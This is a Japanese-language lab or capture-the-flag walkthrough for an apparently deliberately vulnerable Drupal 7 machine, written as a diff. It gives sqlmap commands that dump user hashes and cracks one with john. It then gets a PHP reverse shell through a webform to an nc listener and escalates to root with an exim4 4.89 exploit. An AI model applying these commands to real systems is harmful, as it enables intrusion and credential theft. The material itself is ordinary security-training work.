@@ -1,0 +1,50 @@
+### 論点
+- drupalでログインしてformに書き込みして、php-reverse-shell.phpを使う
+### keyword
+- drupal,sqlmap(get),john,書込みreverseshell,exim4
+
+## 攻略
+- nmap
+  - `-A` drupalであることがわかる
+  - 22,80ポートが開いている
+- サイトを見るとdrupalであることがわかる
+  - robots.txtにいろんなサイトがあるので見ておく
+- msfconsoleやってみる
+  - drupalgeddon2やってみるがversion7は失敗する 
+- サイトを見るとリンクが`/node/1`とかなるが、他にもいろいろリンク探しているとurlに`?nid=1`というのがある
+- このurlのリンクから、攻略は3つくらい考えられる
+  - osコマンドインジェクション `/?nid=ls`
+  - ディレクトリトラバーサル `/?nid=../../../etc/passwd`
+  - SQLインジェクション  
+- SQLインジェクション
+  - `sqlmap -u http://$IP/?nid=3 --dbs --batch`
+    - `d7db`というデータベースがあるのがわかる 
+  - `sqlmap -u http://$IP/?nid=3 -D d7db --tables --batch`
+  - `sqlmap -u http://$IP/?nid=3 -D d7db -T users --columns --batch`
+  - `sqlmap -u http://$IP/?nid=3 -D d7db -T users -C name,pass --dump`
+- userとパスワードがわかるのでjohn
+- `sudo john --format=drupal7 pass.txt /usr/share/wordlists/rockyou.txt`
+  - pass.txtに次のを貼っておく。~は省略
+    - `$S$Dqupvjbx~` 
+  - password:turtle
+- ユーザログインはrobots.txtを参照する
+- /user/loginダッシュボードにログインする
+  - john:turtle
+- ファイルに書き込んでphp-reverse-shellをする 
+  - `nc -nlvp 9001`で待ち受ける
+  - contact usにアクセスする。Webformタブ、次にform settingにphp-reverse-shell.phpを貼り付ける。余計な文字unkoを入力しないとダメ。理由はわからん。Text formatはPHP codeに変更する
+  - Viewタブに移動する。Name,Email Adress,Detailsを適当に入力してSubmitを押すとプロンプトが戻ってくる
+- 対話型シェルにする
+- ユーザをチェック
+  - `ls -la /home` dc8userなるユーザがいる 
+- `sudo -l`
+  - ここでは基本的には`sudo -l`は使わないがなぜか? 
+- SUID
+  - exim4がある。今まで見たことない珍しい 
+  - exim4のバージョンを調べる。`/usr/sbin/exim4 --version`
+- exploitdbを調べる
+  - `exim4 4.89`を探してexploitをコピーする 
+- rootになる
+  - `bash exim.sh -m netcat`
+  - しばらく時間を待って、変化したら使える。プロンプトとかないので注意
+  - exim4はnetcatを利用するが、すぐに切れるので注意
